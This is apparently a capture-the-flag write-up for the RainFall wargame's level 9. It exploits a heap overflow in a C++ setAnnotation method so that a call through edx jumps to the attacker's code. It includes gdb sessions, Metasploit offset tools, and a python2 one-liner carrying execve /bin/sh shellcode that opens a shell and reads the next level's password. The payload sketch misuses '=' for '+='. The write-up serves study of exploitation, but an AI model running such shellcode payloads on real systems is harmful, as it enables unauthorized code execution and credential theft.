# Level 9

We have a c++ program, which contains an N class, with a member function called `setAnnotation` that takes a string as an argument and calls memcpy.

in the main function just after the setAnnotation call, there is a call `edx` that we need to reach in order to overwrite it to execute our shellcode

```
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:   mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:   mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:   mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:   mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:   mov    DWORD PTR [esp],eax
   0x08048693 <+159>:   call   edx
   0x08048695 <+161>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:   leave
   0x08048699 <+165>:   ret
End of assembler dump.
```

just before the call `edx` we can see that the program puts the address of eax into edx then call the edx

First let's find the offset, let's generate a pattern

```
┌──(kali㉿kali)-[~/rainfall]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

Then let's pass this pattern to the program

```
level9@RainFall:~$ gdb -q level9 
Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info reg
eax            0x41366441       1094083649
ecx            0x67413567       1732326759
edx            0x804a0d4        134521044
ebx            0x804a078        134520952
esp            0xbffff640       0xbffff640
ebp            0xbffff668       0xbffff668
esi            0x0      0
edi            0x0      0
eip            0x8048682        0x8048682 <main+142>
eflags         0x210287 [ CF PF SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) 
```

back to our machine let's find the offset

```
┌──(kali㉿kali)-[~/rainfall]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
                                                                                                                                                             
┌──(kali㉿kali)-[~/rainfall]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 0x41366441
[*] Exact match at offset 108
```

The offset is 108 to reach the eax address, let's now check the content of eax, i will use a simple payload with 100 A's


```(gdb) x/100x $eax
0x804a008:      0x08048848      0x41414141      0x41414141      0x41414141
0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a028:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a038:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a048:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a058:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a068:      0x41414141      0x41414141      0x00000005      0x00000071
0x804a078:      0x08048848      0x00000000      0x00000000      0x00000000
0x804a088:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a098:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0a8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0b8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0c8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0d8:      0x00000000      0x00000000      0x00000006      0x00020f21
0x804a0e8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a0f8:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a108:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a118:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a128:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a138:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a148:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a158:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a168:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a178:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a188:      0x00000000      0x00000000      0x00000000      0x00000000
```

The string i passed started 4 bytes after the eax address, so the string is stored at $eax+4, since the eax is dereferenced twice, our payload should look like this

```
payload = EAX_ADDRESS + 4
payload += "\x90" * 4
payload = SHELLCODE
payload = "\x90" * (108 - len(payload))
payload += EAX_ADDRESS
```

the exploit is written in the [exploit.py](exploit.py) file

```python
level9@RainFall:~$ ./level9 $(python2 -c 'print "\x10\xa0\x04\x08" + "\x90" * 4 + "jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80" + "\x90" * 56 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$
```






